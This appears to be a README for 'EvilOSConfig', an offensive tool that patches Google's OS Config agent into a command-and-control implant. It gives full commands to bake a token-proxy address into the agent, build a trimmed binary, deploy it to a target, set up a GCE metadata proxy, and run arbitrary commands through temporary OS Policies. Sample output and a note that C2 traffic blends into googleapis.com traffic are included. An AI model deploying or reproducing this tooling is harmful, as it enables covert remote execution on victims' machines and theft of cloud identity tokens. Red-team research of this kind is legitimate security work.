# EvilOSConfig — Changes & Usage

## evilosconfig-controller.py

Controller script modeled after evilssm-controller.py.

### bake — Hardcode proxy address into the agent

```bash
python3 evilosconfig-controller.py bake <GCE_PROXY_IP>:8080
```

Patches two locations in `agentconfig/agentconfig.go`:
1. `getMetadata()` — hardcodes the metadata host (replaces `os.Getenv(GCE_METADATA_HOST)`)
2. `IDToken()` — routes identity token fetches through `getMetadata()` instead of `metadata.Get()` (which has its own host resolution)

To revert: `python3 evilosconfig-controller.py unbake`

### compile — Build the agent

```bash
python3 evilosconfig-controller.py compile --trim -o evilosconfig
```

| Flag | Effect |
|---|---|
| `--trim` | Stubs out `packages/scalibr.go`, drops scalibr from `go.mod` → **34 MB** (vs 88 MB) |
| `-o NAME` | Output binary name |
| `--ldflags` | Default `-s -w` (strips debug info via linker, not `strip`) |

Without `--trim`: 56 MB (with `-s -w` ldflags)
With `--trim`: **34 MB**

The `--trim` is non-destructive — it backs up files, stubs them for the build, then restores originals. Source stays clean.

### runcmd — Execute a command via OS Policy

```bash
python3 evilosconfig-controller.py runcmd -z us-central1-a "id && hostname"
```

Creates a temporary OS Policy with ExecResource (validate returns `exit 101` to trigger enforcement, enforce runs your command). Polls the compliance report API for output — stdout appears in the `errorMessage` field of the `DESIRED_STATE_ENFORCEMENT` config step. Auto-deletes the policy after.

```
$ python3 evilosconfig-controller.py runcmd -z us-central1-a "id && hostname"
[*] Deploying OS Policy: evilosconfig-cmd-1780843076
[*] Command: id && hostname
[+] Policy deployed. Waiting for execution...
uid=1000(kali) gid=1000(kali) groups=1000(kali),...
rt-local
```

## Setup

### 1. GCE Token Proxy (one-time)

```bash
gcloud compute instances create osconfig-token-proxy \
  --zone=us-central1-a --machine-type=e2-micro \
  --metadata-from-file=startup-script=poc/metadata-proxy.py \
  --tags=metadata-proxy --scopes=cloud-platform

gcloud compute firewall-rules create allow-metadata-proxy \
  --allow=tcp:8080 --target-tags=metadata-proxy

gcloud compute ssh osconfig-token-proxy --zone=us-central1-a \
  --command="sudo systemctl stop google-osconfig-agent"
```

### 2. Bake + Build + Run

```bash
python3 evilosconfig-controller.py bake <GCE_EXTERNAL_IP>:8080
python3 evilosconfig-controller.py compile --trim -o evilosconfig

# Deploy to target — no env vars needed
./evilosconfig
```

### 3. Send Commands

```bash
python3 evilosconfig-controller.py runcmd -z us-central1-a "whoami && id"
```

## Architecture

```
Target Machine                          GCE e2-micro
┌────────────────────┐                 ┌─────────────────┐
│ evilosconfig       │──HTTP:8080─────▶│ metadata-proxy   │
│ (baked proxy addr) │                 │ → 169.254.169.254│
└────────┬───────────┘                 └─────────────────┘
         │ gRPC/TLS :443
         ▼
  osconfig.googleapis.com ← controller sends OS Policy here
```

All C2 traffic is `*.googleapis.com:443`.

## vs EvilSSM

| | EvilSSM | EvilOSConfig |
|---|---|---|
| Code changes | ~500 lines modified | 2 lines patched (via controller) |
| External infra | None (Hybrid Activation) | GCE e2-micro (~$5/mo) |
| Interactive shell | Yes (SSM Session) | No (script execution only) |
| Binary size | ~25 MB | **34 MB** (trimmed) |
| Output retrieval | Inline (RunCommand stdout) | Inline (compliance report `errorMessage`) |
| Detection | `*.amazonaws.com` traffic | `*.googleapis.com` traffic |


